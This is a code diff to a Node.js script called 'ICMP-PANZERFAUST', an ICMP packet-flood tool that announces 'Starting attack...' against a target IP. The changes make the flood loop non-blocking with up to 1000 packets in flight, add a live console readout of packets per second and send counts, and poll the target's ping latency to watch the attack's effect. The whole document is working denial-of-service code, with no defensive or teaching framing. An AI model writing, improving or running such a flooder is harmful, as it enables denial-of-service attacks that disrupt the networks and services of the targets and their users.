@@ -38,19 +38,12 @@ let sent = 0;
 let success = 0;
 let failed = 0;
 let seq = 0;
-let maxPPS = 0;
 let ppsCounter = 0;
+let maxPPS = 0;
 
 const endTime = Date.now() + durationMs;
 
-console.log('ICMP-PANZERFAUST');
-console.log('--------------------------------------');
-console.log(`Target: ${target}`);
-console.log(`Duration: ${durationMs / 1000}s`);
-console.log('Starting attack...\n');
-
 function getPingLatency(ip, callback) {
-  // Cross-platform ping command
   const platform = process.platform;
   let cmd = '';
 
@@ -65,17 +58,13 @@ function getPingLatency(ip, callback) {
       callback(null);
       return;
     }
-
-    // Extract latency from ping output
     let timeMatch = null;
-
     if (platform === 'win32') {
       timeMatch = stdout.match(/Average = (\d+)ms/);
       if (!timeMatch) timeMatch = stdout.match(/time=(\d+)ms/);
     } else {
       timeMatch = stdout.match(/time=([\d.]+) ms/);
     }
-
     if (timeMatch && timeMatch[1]) {
       callback(timeMatch[1]);
     } else {
@@ -84,46 +73,77 @@ function getPingLatency(ip, callback) {
   });
 }
 
-function logStatus() {
-  const currentPPS = ppsCounter / 4;
-  if (currentPPS > maxPPS) maxPPS = currentPPS;
-
-  getPingLatency(target, (latency) => {
-    console.log('--------------------------------------');
-    console.log(`Success: ${success}`);
-    console.log(`Failed: ${failed}`);
-    console.log(`Max PPS: ${maxPPS.toFixed(2)}`);
-    console.log(`Total sent: ${sent}`);
-    console.log(`Target latency: ${latency !== null ? latency + ' ms' : 'N/A'}`);
-    console.log('--------------------------------------\n');
-    // Reset PPS counter for next interval
-    ppsCounter = 0;
-  });
-}
+// To avoid flooding memory, limit max concurrent sends inflight
+const MAX_INFLIGHT = 1000;
+let inflight = 0;
 
 function flood() {
-  while (Date.now() < endTime) {
+  if (Date.now() >= endTime) {
+    socket.close();
+    liveLog(true);
+    process.exit(0);
+  }
+  while (inflight < MAX_INFLIGHT && Date.now() < endTime) {
     const packet = createICMPPacket(seq++);
+    inflight++;
     socket.send(packet, 0, packet.length, target, (err) => {
       sent++;
       ppsCounter++;
+      inflight--;
       if (err) failed++;
       else success++;
     });
   }
-  socket.close();
-  console.log('Attack finished.');
-  logStatus();
-  process.exit(0);
+  // Use setImmediate to avoid blocking event loop
+  setImmediate(flood);
 }
 
-// Log status every 4 seconds until attack ends
-const intervalId = setInterval(() => {
-  if (Date.now() >= endTime) {
-    clearInterval(intervalId);
-    return;
+function clearConsoleLines(n) {
+  for (let i = 0; i < n; i++) {
+    process.stdout.write('\x1b[1A'); // Move cursor up
+    process.stdout.write('\x1b[2K'); // Clear entire line
   }
-  logStatus();
-}, 4000);
+}
+
+let lastLogLines = 9;
+let lastLatency = 'N/A';
+
+function liveLog(final = false) {
+  const currentPPS = ppsCounter * 10; // scaled because interval is 100ms
+  if (currentPPS > maxPPS) maxPPS = currentPPS;
+
+  if (!final) {
+    clearConsoleLines(lastLogLines);
+  }
+
+  process.stdout.write('ICMP-PANZERFAUST\n');
+  process.stdout.write('--------------------------------------\n');
+  process.stdout.write(`Success: ${success}\n`);
+  process.stdout.write(`Failed: ${failed}\n`);
+  process.stdout.write(`Max PPS: ${maxPPS.toFixed(2)}\n`);
+  process.stdout.write(`Total sent: ${sent}\n`);
+  process.stdout.write(`Target latency: ${lastLatency} ms\n`);
+  process.stdout.write('--------------------------------------\n');
+
+  ppsCounter = 0;
+}
+
+function updateLatency() {
+  getPingLatency(target, (lat) => {
+    lastLatency = lat !== null ? lat : 'N/A';
+  });
+}
+
+// Initial header
+console.log('ICMP-PANZERFAUST');
+console.log('--------------------------------------');
+console.log(`Target: ${target}`);
+console.log(`Duration: ${durationMs / 1000}s`);
+console.log('Starting attack...\n');
+
+liveLog();
+
+setInterval(liveLog, 100);
+setInterval(updateLatency, 4000);
 
 flood();
